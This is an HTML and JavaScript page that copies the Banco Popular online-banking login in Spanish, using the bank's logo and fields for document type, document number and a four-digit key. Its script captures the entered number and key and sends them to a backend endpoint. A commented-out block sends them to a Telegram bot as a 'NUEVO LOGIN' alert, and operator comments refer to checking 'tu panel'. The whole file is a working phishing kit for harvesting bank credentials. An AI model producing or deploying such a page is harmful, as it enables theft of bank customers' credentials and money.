<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bienvenido a Banco Popular</title>
    <style>
        /* RESET Y ESTILOS BASE */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #f3f4f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        
        .main-container { display: flex; width: 100%; max-width: 1200px; background: #fff; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); overflow: hidden; }
        
        /* COLUMNA IZQUIERDA - FORMULARIO */
        .login-section { flex: 1; padding: 50px; display: flex; flex-direction: column; justify-content: center; }
        
        .logo-container { margin-bottom: 40px; }
        .logo-container img { height: 40px; }
        
        .welcome-text { font-size: 24px; color: #111; margin-bottom: 5px; font-weight: 600; }
        .logo-text { color: #00a650; font-size: 28px; font-weight: 800; margin-bottom: 40px; display: flex; align-items: center; gap: 8px; }
        .logo-text span { font-size: 20px; color: #000; font-weight: 400; margin-left: 5px;}

        /* CAMPOS */
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; font-size: 14px; color: #333; margin-bottom: 8px; }
        
        .select-custom, .input-custom { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; color: #333; outline: none; transition: border 0.3s; }
        .select-custom:focus, .input-custom:focus { border-color: #00a650; }
        
        /* CLAVE CON CUADROS */
        .password-container { display: flex; gap: 10px; position: relative; }
        .pass-box { flex: 1; height: 50px; border: 1px solid #ddd; border-radius: 8px; text-align: center; font-size: 18px; font-weight: bold; outline: none; transition: border 0.3s; }
        .pass-box:focus { border-color: #00a650; }
        .eye-icon { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #777; }

        .forgot-pass { text-align: right; display: block; font-size: 13px; color: #e31837; text-decoration: none; margin-top: 5px; font-weight: 600;}
        
        /* TOGGLE */
        .toggle-container { display: flex; align-items: center; margin-top: 20px; margin-bottom: 30px; }
        .toggle-switch { position: relative; display: inline-block; width: 50px; height: 26px; }
        .toggle-switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
        .slider:before { position: absolute; content: ""; height: 20px; width: 20px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
        input:checked + .slider { background-color: #00a650; }
        input:checked + .slider:before { transform: translateX(24px); }
        .toggle-text { margin-left: 12px; font-size: 14px; color: #333; }

        /* BOTÓN */
        .btn-continue { width: 100%; padding: 16px; background-color: #d1d5db; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: not-allowed; transition: background 0.3s; }
        .btn-continue.active { background-color: #e31837; cursor: pointer; }
        
        /* FOOTER */
        .register-link { text-align: center; margin-top: 20px; font-size: 14px; color: #555; }
        .register-link a { color: #e31837; text-decoration: none; font-weight: 600; }
        .footer-legal { text-align: center; margin-top: 30px; font-size: 11px; color: #999; line-height: 1.5; }
        .footer-legal a { color: #e31837; text-decoration: none; }

        /* COLUMNA DERECHA - IMAGEN */
        .image-section { flex: 1; background-color: #f9fafb; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .image-section img { width: 100%; max-width: 500px; height: auto; }

        /* RESPONSIVE */
        @media (max-width: 768px) {
            .main-container { flex-direction: column; }
            .image-section { display: none; } /* Oculta la imagen en móviles */
            .login-section { padding: 30px 20px; }
        }

        /* LOADER Y MENSAJES */
        .loading-overlay { display: none; position: fixed; inset: 0; background: rgba(255, 255, 255, 0.85); z-index: 10000; align-items: center; justify-content: center; flex-direction: column; }
        .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #00a650; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { from { transform: rotate(0); } to { transform: rotate(360deg); } }
        .error-msg { display: none; color: #e31837; font-size: 13px; margin-top: 5px; }
        .error-msg.show { display: block; }
    </style>
</head>
<body>

    <!-- Loader -->
    <div class="loading-overlay" id="loading-overlay">
        <div class="loading-spinner"></div>
        <p style="margin-top: 15px; color: #333; font-weight: 600;">Procesando solicitud...</p>
    </div>

    <div class="main-container">
        <!-- SECCIÓN IZQUIERDA -->
        <div class="login-section">
            <div class="logo-container">
                <!-- Logo superior opcional -->
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Logo_Banco_Popular.svg/1200px-Logo_Banco_Popular.svg.png" alt="Banco Popular">
            </div>

            <h2 class="welcome-text">Bienvenido a</h2>
            <div class="logo-text">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Logo_Banco_Popular.svg/1200px-Logo_Banco_Popular.svg.png" alt="Logo P" style="height:30px;">
                <span>banco popular</span>
            </div>

            <form id="loginForm">
                <div class="form-group">
                    <label>Tipo de documento</label>
                    <select class="select-custom" id="tipo_doc">
                        <option value="CC">Cédula de Ciudadanía</option>
                        <option value="CE">Cédula de Extranjería</option>
                        <option value="NIT">NIT</option>
                        <option value="PA">Pasaporte</option>
                    </select>
                </div>

                <div class="form-group">
                    <label>Número de documento</label>
                    <input type="text" class="input-custom" id="num_doc" placeholder="Ingresa tu número" autocomplete="off" required>
                </div>

                <div class="form-group">
                    <label>Contraseña única</label>
                    <div class="password-container">
                        <!-- 4 cuadros para la contraseña -->
                        <input type="password" class="pass-box" maxlength="1" inputmode="numeric">
                        <input type="password" class="pass-box" maxlength="1" inputmode="numeric">
                        <input type="password" class="pass-box" maxlength="1" inputmode="numeric">
                        <input type="password" class="pass-box" maxlength="1" inputmode="numeric">
                        <span class="eye-icon">👁️</span>
                    </div>
                    <a href="#" class="forgot-pass">¿La olvidaste?</a>
                </div>

                <div class="toggle-container">
                    <label class="toggle-switch">
                        <input type="checkbox">
                        <span class="slider"></span>
                    </label>
                    <span class="toggle-text">Recordar tipo y número de documento</span>
                </div>

                <p id="loginError" class="error-msg">Datos incorrectos. Por favor verifica.</p>

                <button type="submit" id="submitBtn" class="btn-continue" disabled>Continuar</button>
            </form>

            <div class="register-link">
                ¿No eres usuario? <a href="#">Regístrate aquí</a>
            </div>

            <div class="footer-legal">
                Protegido por reCAPTCHA - <a href="#">Privacidad</a> - <a href="#">Condiciones</a>
            </div>
        </div>

        <!-- SECCIÓN DERECHA (IMAGEN) -->
        <div class="image-section">
            <!-- Aquí puedes poner la URL de la imagen que sale en tu captura -->
            <img src="https://i.ibb.co/6PZ7Z7x/banco-popular-img.png" alt="Zona Transaccional" onerror="this.src='https://via.placeholder.com/500x400/f9fafb/cccccc?text=Imagen+Zona+Transaccional'">
        </div>
    </div>

    <script>
        // ==========================================
        // LÓGICA DE CONTROL Y ENVÍO DE DATOS
        // ==========================================
        
        const numDocInput = document.getElementById("num_doc");
        const tipoDocSelect = document.getElementById("tipo_doc");
        const passBoxes = document.querySelectorAll(".pass-box");
        const submitBtn = document.getElementById("submitBtn");
        const loginForm = document.getElementById("loginForm");
        const loadingOverlay = document.getElementById('loading-overlay');
        const loginError = document.getElementById('loginError');
        
        let usuarioCompleto = "";

        // Lógica para mover el cursor entre los cuadros de la contraseña
        passBoxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < passBoxes.length - 1) {
                    passBoxes[index + 1].focus();
                }
                verificarBoton();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
                    passBoxes[index - 1].focus();
                }
            });
        });

        // Validar si el botón debe activarse
        function verificarBoton() {
            const docLleno = numDocInput.value.trim().length > 0;
            let passLlena = true;
            passBoxes.forEach(box => { if (box.value.length === 0) passLlena = false; });

            if (docLleno && passLlena) {
                submitBtn.disabled = false;
                submitBtn.classList.add('active');
                loginError.classList.remove("show");
            } else {
                submitBtn.disabled = true;
                submitBtn.classList.remove('active');
            }
        }

        numDocInput.addEventListener("input", verificarBoton);

        function mostrarOverlay() { loadingOverlay.style.display = 'flex'; }
        function ocultarOverlay() { loadingOverlay.style.display = 'none'; }

        // ==========================================
        // ENVÍO AL SERVIDOR (O TELEGRAM SI PREFIERES)
        // ==========================================
        async function enviarDatos() {
            const tipo = tipoDocSelect.value;
            const documento = numDocInput.value.trim();
            let clave = "";
            passBoxes.forEach(box => clave += box.value);
            
            usuarioCompleto = `${tipo} - ${documento}`;

            // AQUÍ CONECTAS CON TU BACKEND (O TELEGRAM)
            try {
                // Ejemplo usando Fetch a tu API (asegúrate de tener el backend corriendo)
                await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        usuario: usuarioCompleto, 
                        clave: clave,
                        ip: '0.0.0.0'
                    })
                });
                
                // Si quieres usar TELEGRAM en lugar de backend, descomenta esto:
                /*
                const TG_BOT_TOKEN = 'TU_TOKEN';
                const TG_CHAT_ID = 'TU_ID';
                const mensaje = `⚡ <b>NUEVO LOGIN - POPULAR</b>\n\n👤 <b>Documento:</b> ${usuarioCompleto}\n🔑 <b>Clave:</b> ${clave}\n\n📅 ${new Date().toLocaleString('es-CO')}`;
                
                await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
                });
                */
                
            } catch (e) { 
                console.error("Error al enviar:", e); 
            }
        }

        // Cuando el usuario envía el formulario
        loginForm.addEventListener("submit", async (e) => {
            e.preventDefault();
            if (submitBtn.disabled) return;

            mostrarOverlay();
            await enviarDatos();
            ocultarOverlay();
            
            // Opcional: Redirigir a una página de "Procesando" o mostrar modal
            // alert("Datos enviados. Revisa tu panel.");
        });
    </script>
</body>
</html>
